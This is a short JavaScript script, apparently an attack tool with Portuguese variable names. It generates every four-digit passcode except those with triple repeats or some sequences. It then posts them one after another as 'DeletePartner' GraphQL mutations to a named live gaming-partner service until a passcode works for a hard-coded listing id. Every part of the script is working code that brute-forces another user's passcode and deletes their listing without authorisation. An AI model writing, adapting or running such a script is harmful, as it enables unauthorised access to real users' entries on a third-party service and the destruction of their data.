var theids = [
  "3543580"
];

function hasConsecutiveSequences(str) {
  for (let i = 0; i < str.length - 3; i++) {
    const sequence = str.slice(i, i + 4);
    if (parseInt(sequence) === parseInt(sequence[0].repeat(4)) + 1) {
      return true;
    }
  }
  return false;
}

function hasRepeatingNumbers(str) {
  for (let i = 0; i < str.length - 2; i++) {
    if (str[i] === str[i + 1] && str[i] === str[i + 2]) {
      return true;
    }
  }
  return false;
}

const numbersArray = [];

for (let i = 0; i <= 9999; i++) {
  const paddedNumber = i.toString().padStart(4, '0');
  if (!hasConsecutiveSequences(paddedNumber) && !hasRepeatingNumbers(paddedNumber)) {
    numbersArray.push(paddedNumber);
  }
}

var senhas = numbersArray;
var i;

async function wipeDay(){
    var c4 = [];

    var y = 0;
    const uniqueNumbers = theids;
    for(y = 0; y < uniqueNumbers.length; y++){
      i = 0;
      var res = await httpRequest(uniqueNumbers[y]);
      console.log(res);
      c4.push(res);
    }
    //console.clear();
    console.log(c4);
}

async function httpRequest(id) {
  
  var found = false;
   //console.clear();
   console.log('Processando... id: ' + id)

   while(found == false){

       let kboom = await TheBomb(id,senhas[i])

       if(kboom == false){
         if(i <= senhas.length){
          i++;
          // console.clear();
          //console.log('Senhas testadas: ' + i + '/' + senhas.length + ' - (' + senhas[i] + ', ' + kboom + ')')
         } else {
           found = true;
         }
       } else if (kboom == true) {
         console.log('Senhas encontrada: ' + i + '/' + senhas.length + ' - (' + senhas[i] + ', ' + kboom + ')')
         return {
                  'Id': id,
                  'Senha':senhas[i]
                }
       } else {
         await httpRequest(id);
       }
       found = kboom;
   }
}

async function TheBomb(id,pass){

    return fetch("https://duo.op.gg/graphql", {
      method: "POST",
      body: JSON.stringify( {
        "operationName": "DeletePartner",
        "variables": {
        "id": id,
        "passcode": pass
        },
        "query": "mutation DeletePartner($id: ID!, $passcode: String) {\n  deletePartner(id: $id, passcode: $passcode) {\n    id\n    __typename\n  }\n}"
      }),
      headers: { "Content-type" : "application/json" }
    }).then(response => response.json())
      .then(data => {
          //console.log(data)
          if(data.data != null){
            return true;
        } else {
            return false;
        }
        
      })
      .catch (e => {
        console.log(e)
        TheBomb(id,pass)
      })
    

}


wipeDay();
